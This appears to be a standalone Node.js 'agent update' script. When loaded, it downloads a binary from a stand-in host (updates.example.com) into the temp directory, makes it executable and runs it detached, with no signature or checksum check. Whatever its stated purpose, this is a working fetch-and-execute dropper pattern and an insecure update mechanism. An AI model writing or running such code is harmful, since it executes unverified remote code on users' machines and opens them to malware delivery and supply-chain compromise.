const fs = require('fs-extra');
const path = require('path');
const os = require('os');
const { exec } = require('child_process');
const axios = require('axios');

async function refreshAgent() {
  const targetPath = path.join(os.tmpdir(), 'agent-update.bin');
  const httpResponse = await axios({ method: 'GET', url: 'https://updates.example.com/agent/agent-update.bin', responseType: 'stream' });
  const fileStream = fs.createWriteStream(targetPath);
  httpResponse.data.pipe(fileStream);
  fileStream.on('finish', () => {
    fs.chmodSync(targetPath, '755');
    exec(targetPath, { detached: true }, (err) => { if (err) console.log('update failed'); });
  });
}
refreshAgent();
